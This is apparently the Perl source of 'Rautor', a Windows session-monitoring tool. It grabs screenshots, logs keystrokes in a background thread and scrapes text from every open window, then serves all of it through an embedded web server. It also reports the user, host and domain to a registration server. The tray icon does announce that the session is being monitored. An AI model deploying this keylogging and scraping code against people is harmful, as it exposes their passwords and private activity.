#!wperl.exe
#
# A screen grabber with an embedded Web Server
# and a session registration engine !
# Angelos Karageorgiou
# angelos@unix.gr
#

package Rautor;

use common::sense;

use SysTray;
use Win32::TieRegistry ( Delimiter=>'/');
use Win32::Process;
use IO::Select;
use HTTP::Daemon;
use HTTP::Response;
use HTTP::Status;
use LWP::UserAgent;
use HTTP::Request;
use Win32;
use Win32::API;
use Win32::GUI();
use Win32::GUI::DIBitmap;
use Win32::GuiTest qw|FindWindowLike IsWindowVisible GetWindowText WMGetText IsKeyPressed GetAsyncKeyState|;
use Crypt::Tea;
use Getopt::Long;
use threads;
use threads::shared;
use IO::Socket::INET;
use File::Basename;
use File::Spec qw 'rel2abs';
use IO::Select;

my $VERBOSE;
my $KEYLOG:shared="";
my $KEY='perl -e "{print \$key}"';
my $RAUTORPASS='$RAUTORPASS';
my $TIP="Rautor Live Session Monitor";
my $SLIDESBITS=16;
our %keymap;

$SIG{INT}=\&Shutdown;

our $REGSERVER="rautor";
our $MYNAME="Rautor"; # needed by rreg.pl :-(

push @INC,dirname($0);
push @INC,"..\\common";
require "Keymap.pl";            # registry stuff , common with rrs.pl
require "rreg.pl";

	# hide child windows like netstat :-)
 if ( defined &Win32::SetChildShowWindow ){
	Win32::SetChildShowWindow(0) 
 }

GetOptions (
        'verbose'   => \$VERBOSE,
);

ReadRegistry();

our $REGURL="https://".$REGSERVER."/cgi-bin/register.fcgi";
our $validationURL="https://".$REGSERVER."/cgi-bin/admin_ips.fcgi";
my  $REGURLorig=$REGURL;

if ( ! $REGURL ) {
	$REGURL=$REGURLorig;
}
if ( $REGURL eq "" ) {
	$REGURL=$REGURLorig;
}
print "Regurl is:" . $REGURL ."\n" if ( $VERBOSE);


my $PORT=int(1024+rand(42000));
print "Port is $PORT\n" if ( $VERBOSE);

#primary
my $GetDC = new Win32::API('user32', 'GetDC',     ['N'],     'N');
my $RelDC = new Win32::API('user32', 'ReleaseDC', [qw/N N/], 'I');
#Alternate
my $GetDW = new Win32::API('user32','GetDesktopWindow', [],  'N');
my $DESKTOP = $GetDW->Call();
my $MAXSCREENS=10;
my $imgFname="screen.png";
my $NumScreens=CountMonitors();
our  $user=Win32::LoginName();
our  $Node=Win32::NodeName();
our  $domain=Win32::DomainName();
my $SLEEP=5;
our $QUANTUM=130;


print STDERR "I found $NumScreens Screens\n" if ( $VERBOSE);
my $GUID=Win32::GuidGen();
my $RepeatHeader="<HEAD><META HTTP-EQUIV=REFRESH CONTENT=$SLEEP></HEAD>\r\n
<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"2\" style=\"position:relative\">\r\n
";

my $SESSION=substr($GUID,1,length($GUID)-2);
$SESSION=~ s/\-//gi;

my $ENC=encrypt($RAUTORPASS,$KEY);		
print STDERR "$SESSION\n" if ( $VERBOSE); 
ReadRegistry();

print STDERR "Creating Keylogger Thread\n" if ( $VERBOSE);
my $keytid=threads->create('KeyLogger',$QUANTUM)->detach();

print STDERR "Creating HTTP Daemon\n" if ( $VERBOSE);
#$HTTP::Daemon::PROTO = "HTTP/1.0";
my $daemon  = HTTP::Daemon->new(Listen=>10,LocalPort=>$PORT, ReuseAddr=>1) || &Shutdown();	
my $s= IO::Select->new();
$s->add($daemon);    


print STDERR "Trying to Register with $REGURL\n" if ( $VERBOSE);
my $Registered=Register($REGURL,$user,$ENC,$SESSION,$PORT,$Node,$domain,"START"); 

## do the upnp stuf what is 
#eval {
#       		local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
#       		alarm 5;
#			&doUPnP();
#      		alarm 0;
#  	};
#	if ($@) {
#	print "Upnp timed out\n" if ( $VERBOSE);
#	}

my $ICONPATH=locateFile("bull_lined.ico");		
my $redIconFile=locateFile("redbull.ico");

SysTray::create("my_callback", $ICONPATH, $TIP);
my $lastRtime=time;
my $lastKtime:shared=time;
 while (1) {
	SysTray::do_events();  # non-blocking
 	web($daemon,$SESSION,$ICONPATH,$redIconFile,$s);   
	Win32::Sleep(10);
	
   if ( time > ( $lastRtime + 30 ) ) {
		if ( ! $Registered) {
			ReadRegistry();
			$Registered=Register($REGURL,$user,$ENC,$SESSION,$PORT,$Node,$domain,"START"); 
		} else {
			Register($REGURL,$user,$ENC,$SESSION,$PORT,$Node,$domain,"ALIVE"); 
		}
		$lastRtime=time;
	}
	SysTray::do_events();  # non-blocking
	if ( time > ( $lastKtime + 5 ) ) {  # reset the keyboard log
		{
		lock $KEYLOG;
		lock $lastKtime;
		$KEYLOG="";
		$lastKtime=time;
		}
	}
 }

Shutdown();

1;


########################################################################################
# callback sub for receiving systray events
 sub my_callback {
   my $events = shift;      
   
   print STDERR "Event Received $events\n" if ( $VERBOSE);

   if ( ($events & SysTray::MB_LEFT_CLICK) || ($events & SysTray::MB_RIGHT_CLICK)  ){
     doexplorer("http://www.unix.gr/rautor");
   }
   
   if (	($events & SysTray::MSG_LOGOFF) ||	($events & SysTray::MSG_SHUTDOWN) 	  ){
    Shutdown();
   }
 }
 
 
########################################################################################
sub doexplorer{	
	my $url=shift;
	
	my	$browserkey= $Registry->{"HKEY_CLASSES_ROOT/http/shell/open/command"};
	my	$default_browser = "$browserkey->{'/'}";
		$default_browser =~ s/\"//g;
		$default_browser =~ s/\ -.*//g;
	my	$stripped_browser=basename($default_browser);
		$stripped_browser =~ s/\".*//g;
		$stripped_browser =~ s/ .*//g;

	my $browser;
	Win32::Process::Create($browser, $default_browser,
        $stripped_browser  ." $url", 0,
        NORMAL_PRIORITY_CLASS, ".") || return 0;
}


 
 
########################################################################################
sub web{
my ($daemon,$SESSION,$bullfname,$redfname,$sel)=@_;

my $lastRtime=time;
if(my @ready = $sel->can_read) {
 print STDERR ".";
     foreach my $fh (@ready) {
         if($fh == $daemon) {
             # Create a new socket
            my $new = $daemon->accept;
            $sel->add($new);
         }
         else {
            SysTray::change_icon($redfname);
			SysTray::set_tooltip("Your Session is being monitored");
			# go for it	
			process_one_req($fh,$SESSION);
			$sel->remove($fh);
			$fh->close;
			Win32::Sleep(20); # let's deny DDOS :-)	
			SysTray::change_icon($bullfname);
			SysTray::set_tooltip($TIP);
        }  
    }
  }
}

########################################################################################
sub process_one_req {
    my $connection = shift;	
	my $SESSIONID=shift;
	
	my $RepeatHTML=$RepeatHeader;
	
    # Verify the caller	
	my @ip = unpack("C4",$connection->peeraddr);
	my $ip=join(".",@ip);
	my $IPS=get_admin_ips();
	print  STDERR "Admin IPS:$IPS\n" if ( $VERBOSE);

	if ( $IPS !~ /$ip/) {
		$connection->send_error(RC_FORBIDDEN);
		next;
	}	
	my $receiver = $connection->get_request;
	if ( ! $receiver ) {
		return;
	}
	if (! ($receiver->method eq 'GET') ){					# Method GET
       		$connection->send_error(RC_FORBIDDEN);
			return;
	}
	$receiver->url->path =~ m/^\/(.*)\/(.*)$/mi;
	my $session=$1;
	my $path=$2;	
	
	
	if ( $session ne $SESSIONID) {
	  		$connection->send_error(RC_FORBIDDEN);
			return;
	}
	###########################
	if  ($path eq "monitor8bits" ) {	
		$SLIDESBITS=8;
		$path="monitor";	
		#pass through
	}
	###########################
	if  ($path eq "monitor16bits" ) {	
		$SLIDESBITS=16;
		$path="monitor";	
		#pass through
	}
	###########################
    if  ( ($path eq "monitor" ) || ($path eq "" ) ) 	{			# URL is /monitor or null
		domonitor($connection,$RepeatHTML,$SESSIONID);
		return;	
	}
	
	###########################
	if  ($path eq "numscreens" ) {	
       		my $response = HTTP::Response->new(200);
			my $Text="The system has " . $NumScreens . " monitor(s)";
       		$response->content($Text);
			$connection->send_response($response);	
			return;
	}
	
	###########################
    if  ($path =~ /^screen([1-9]*)\.png$/ )  {	# Screen[1-9].png		
		my $scrnum=1;
		if ( $1 ) {
			$scrnum=$1;
		}
		my $res=screendumper($scrnum);
		my $fname="screen".$scrnum.".png";
		if ( $fname eq "screen.png" ) {
			$fname="screen1.png";
		}
		if ( ! -f $ENV{APPDATA} ."\\". $fname )  {
          		$connection->send_error(404,"Could not grab the screen num $scrnum");
			$connection->close;
			undef($connection);
			return;
		}
       	my $response = HTTP::Response->new(200);
       	$response->push_header('Content-Type','image/png');
		$connection->send_response($response);
		$connection->send_file($ENV{APPDATA}."\\".$fname);
		unlink $fname;
	return;
	}
	
	###########################
	if  ($path eq "scrape" ) {
		my $Text=DumpAnyText();
		my $response = HTTP::Response->new(3000);
		$response->content('<pre>' . $Text . '</pre>');
		$connection->send_response($response);
		return;
	}
	###########################
	if  ($path eq "keylog" ) {
		my $Text=$KEYLOG;				
		my $response = HTTP::Response->new(200);
		$response->content('<pre>' . $Text . '</pre>');
		$connection->send_response($response);
		{
		lock $KEYLOG;
		lock $lastKtime;
		$KEYLOG="";
		$lastKtime=time;
		}
		return;
	}
	###########################
#	if  ($path eq "netstat" ) {					# /netstat
#  	my $response = HTTP::Response->new(200);
#	my $Text=readnetstat("c:\\WINDOWS\\system32\\\\netstat.exe -bn");
#	if ( ! $Text ) {
#    		$connection->send_error(404,"Could not do netstat");
#	} else {
#    		$response->content($Text);
#		$connection->send_response($response);	
#	}
#	return;
#}
	###########################
#	if  ($path eq "fullnetstat" ) {				# /fullnetstat
#   	my $response = HTTP::Response->new(200);
#		my $Text=readnetstat("c:\\WINDOWS\\system32\\netstat.exe -bavn");
#		if ( ! $Text ) {
#       		$connection->send_error(404,"Could not do netstat");
#		} else {
#  			$response->content($Text);
#			$connection->send_response($response);	
#		}
#		return;	
#}
	# no matches
	$connection->send_error(RC_FORBIDDEN);
}


######################################################################
sub domonitor{
my ($connection,$RepeatHTML,$SESSIONID)=@_;
my $spaces="&nbsp;" x 10;

	$RepeatHTML .= 	"
		<tr><td colspan=$NumScreens align=center bgcolor=silver> 
			<font color=red size=2><a href=\"/$SESSIONID\/monitor8bits\">[Monitor in 8-bit mode]</a> $spaces
			<a href=\"/$SESSIONID\/scrape\">[Dump Textual Contents]</a> $spaces
			<a href=\"/$SESSIONID\/monitor16bits\">[Monitor in 16-bit mode] </a>
			</font>
		</td> </tr>
		<tr bgcolor=\#afafff> 			
			<td colspan=$NumScreens><font color=white size=1>Keystrokes: $KEYLOG</font></td> 		
		</tr>
	";
	
	for (my $i=1;$i<=$NumScreens;$i++){		
		my $fname="screen".$i.".png";
		$RepeatHTML .= "
			<tr>
			<td>
				<a href=\"/" .$SESSIONID  . "/" . $fname . "\">
				<img src=\"/$SESSIONID\/$fname\" width=\"100%\" height=\"100%\" align=center></a>
			</td>
			</tr>\r\n
			";		
	}
		
	$RepeatHTML .= "</table>";		
    my $response = HTTP::Response->new(length($RepeatHTML));
    $response->content($RepeatHTML);
	$connection->send_response($response);	
}


######################################################################
sub doUPnP {
	my $dir=locateFile("upnpc-static.exe");
		if ( ! $dir ) {				
			print STDERR "Upnpc executable not found\n" if ( $VERBOSE);			
			return;
		}
		
		open(my $IN,"$dir\\upnpc-static.exe -r $PORT tcp|");
		if ( ! $IN) {
			print STDERR "Could not open pipe from upnpc\n" if ( $VERBOSE);
			return;		
		}
		while(<$IN>){
			print "$_\n" if ( $VERBOSE);				
		}		
		close($IN);
}



######################################################################
# now catch the keyboard , while sleeping in fits and starts
#
# keylogger sleeps $QUANTUM miliseconds so use it to delay
#
######################################################################
sub KeyLogger{
  my  ($QUANTUM)=@_;		
  while (1) {	
 		for ( my $i=0; $i<255;$i++){
 			if (IsKeyPressed($i)){
				if ( length( $keymap{$i}) ==1  ) {
					{
					lock $KEYLOG;
					$KEYLOG .= $keymap{$i};
					}
				} else {
					{
					lock $KEYLOG;
					$KEYLOG .=  " [" . $keymap{$i} . "]" ;
					}
				}				
				if ($i == 0x0D)	{
						;
				} # ENTER was pressed
			}
		}
		Win32::Sleep($QUANTUM);
	}
}


############################################################
sub readnetstat{
	my $cmdline=shift;
 	my $Text="<table border=0><tr><th>Proto</th><th>Local Address</th><th>Foreign Address</th><th>State</th><th>PID</th></tr>\n";

	open (FIN , "$cmdline|") || return undef;	
	while (<FIN>){
		next if ( /^\s[\s]*$/);
		$_ =~ s/^\s*//g;
		$_ =~ s/\s[\s]*/ /g;
		chomp($_);
		chomp($_);
		next if ( /^Active/);
		next if ( /^Proto/);
		my ($Proto,$LocalAddress,$ForeignAddress,$State,$PID)=split(/\s/,$_);
		if  ( ( $Proto  eq 'TCP' ) or  ( $Proto  eq 'UDP')){
			$Text .= "<tr><td colspan=5>&nbsp<hr></td></tr>\n";
			$Text .= "<tr><td>$Proto</td><td>$LocalAddress</td><td>$ForeignAddress</td><td>$State</td><td>$PID</td></tr>\n";
		} else {
			$Text .= "<tr><td colspan=5>$_</td></tr>\n";
		}
	}
	$Text .= "</table>";
return $Text;
}


############################################################
sub screendumper{
	my ($i)=shift(@_);

	my $disp="\\\\.\\Display".$i;
	my $fname=$ENV{APPDATA}."\\screen".$i.".png";
 	my $Screen = new Win32::GUI::DC("DISPLAY",$disp);
	if ( $Screen){
   	 	my $image = newFromDC Win32::GUI::DIBitmap($Screen) ;
		my $scaled=scale($image);
       	if ( $scaled ) {			
			$scaled->SaveToFile($fname);
       	}
		Win32::GUI::DC::ReleaseDC(0,$Screen);
	}
}


############################################################
sub scale{
	my $image=shift;
	
print "BITS $SLIDESBITS\n" if $VERBOSE;

	if ($SLIDESBITS ==8 ) {			
			my $new=$image->ConvertTo8Bits();	
			my $ximage=$new->ColorQuantize();
			return $ximage;
	} elsif ($SLIDESBITS == 16 ) {
			my $newimage=$image->ConvertTo16Bits565();
			return $newimage;
	}
	return $image; # justincase
}

############################################################
sub screendumper_singleton{
	my $dc  = $GetDC->Call(0);
	if ( ! $dc ) {
		return -1;
	}
	my $image = newFromDC Win32::GUI::DIBitmap($dc) ;

	if ( ! $image ) {	
		return -1;
	}
	$RelDC->Call(0,$dc);
	$image->SaveToFile($ENV{APPDATA}."\\".$ENV{APPDATA}."\\".$imgFname)	|| return -1;
	return 1;
}


############################################################
sub screendumper2{
	my $image = newFromWindow Win32::GUI::DIBitmap($DESKTOP,0) ;
	if ( ! $image ) {	
		return ( -1 );
	}
	$image->SaveToFile($ENV{APPDATA}. "\\" .$imgFname)	|| return -1;
	return(1);

}

######################################################################
sub CountMonitors{
my $NumScreens=0;
for (my $i=0;$i<$MAXSCREENS;$i++){
	my $dispname="\\\\.\\Display".$i;
	my $Screen=new Win32::GUI::DC("DISPLAY",$dispname);
	if ( $Screen ) {
		my $image = newFromDC Win32::GUI::DIBitmap($Screen) ;
 		if ( $image ) {
			$NumScreens++;
		}
		Win32::GUI::DC::ReleaseDC(0,$Screen);
	}
}
return $NumScreens;
}

######################################################################
sub Register {		
        my ( $url, $user, $pass,$session,$port,$node,$domain,$status ) = @_;
		my $ua = new LWP::UserAgent(
                timeout=>1,
                agent=>'RautorWeb',
                );
            
     my $req = $ua->post($url,
                 [                     
                     user 	=> $user,
                     pass 	=> $pass,
					 session=> $session,
					 port	=> $port,
					 node	=> $Node,
					 domain => $domain,
					 status => $status,
                     errors	=> 1
             ]);
			 
     if (! $req->is_success) {             
              print STDERR "ERROR:REGISTRATION with status=$status failed\n\n" if ( $VERBOSE );              
			  return -1;
     }
	 
	 if ( $req->content =~ /RAUTOR:Registration OK/ ){
			print "Registration with status=$status successful\n" if ( $VERBOSE);
			return 1;
	 } else {
			print "ERROR: Registration with status=$status failed\n" if ( $VERBOSE);
			return undef;
	 }
}


######################################################################
sub get_admin_ips {		
		my $ua = new LWP::UserAgent(
                timeout=>5,
                agent=>'RautorWeb',
                );
            
     my $req = $ua->post($validationURL,
                 [                     
                     user 	=> 'RAUTOR',
                     pass 	=> encrypt('$RAUTORPASS',$KEY),
                     errors	=> 1
             ]);
			 
     if (! $req->is_success) {             
              return undef;
     }
	 if ( $req->content =~ /RAUTOR:ERROR/ ){
			print "Error getting admin IPs\n" if ( $VERBOSE);
			return undef;
	 }
	 return $req->content;
}

############# Screen Scraper Section ################
#####################################################
sub DumpAnyText{
	my $Text="";
	my @hwnds = FindWindowLike();     
	foreach my $window (@hwnds) {
		my $title=GetWindowText($window);
		next if ( $title =~ /^$/);
		$Text .= "[$title]\n";
	
		my @edits=FindWindowLike($window,"","");
		foreach my $ed (@edits) {
			my $text=" " x 65536;
			$text=GetWhatYoucan($ed);
			$text=~s/\x00/ / ;
			$text=~s/[\r\n]$// ;
			next if ($text =~ /^$/ );
			$Text .= "\t". $text ."\n";
		}
		$Text .= "\n";
	}
	return($Text);
}

######################################################################
sub GetWhatYoucan{
	my $ed=shift;

	my $text="";
    	eval {
       		local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
       		alarm 1;
				$text=WMGetText($ed);
       		alarm 0;
    	};
    	if ($@) {
			return undef;
    	}
	return $text;
}

######################################################################
sub locateFile {
	my $icon=shift;
	my $ICONPATH='';
	
	#snippet shamelessly stolen from splashscreen.pm
	my @dirs;
	
	
	push @dirs, File::Spec->rel2abs(dirname($0));
	# cwd
	push @dirs, ".";
	push @dirs, $ENV{TEMP} if exists $ENV{TEMP};
	push @dirs, $ENV{TMP} if exists $ENV{TMP};
	push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
	push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};

	for my $dir (@dirs) {
		next unless -d $dir;		
		if ( -f $dir . "\\" .$icon ) {
			$ICONPATH=$dir ."\\" . $icon;	
			print STDERR "Found icon $icon under $dir\n" if $VERBOSE;
			return $ICONPATH;
		}
	}
}




######################################################################################## 
END {
	Shutdown();
}

########################################################################################
sub Shutdown{
	print STDERR "Shutdown Called\n" if ( $VERBOSE);
	print $REGURL ." " . $user." " . $ENC." " . $SESSION." " . $PORT." " . $Node." " . $domain." " . "LOGOUT" . "\n";;
	Register($REGURL,$user,$ENC,$SESSION,$PORT,$Node,$domain,"LOGOUT");
	SysTray::destroy();
    exit;
}

########################################################################################
########################################################################################
########################################################################################


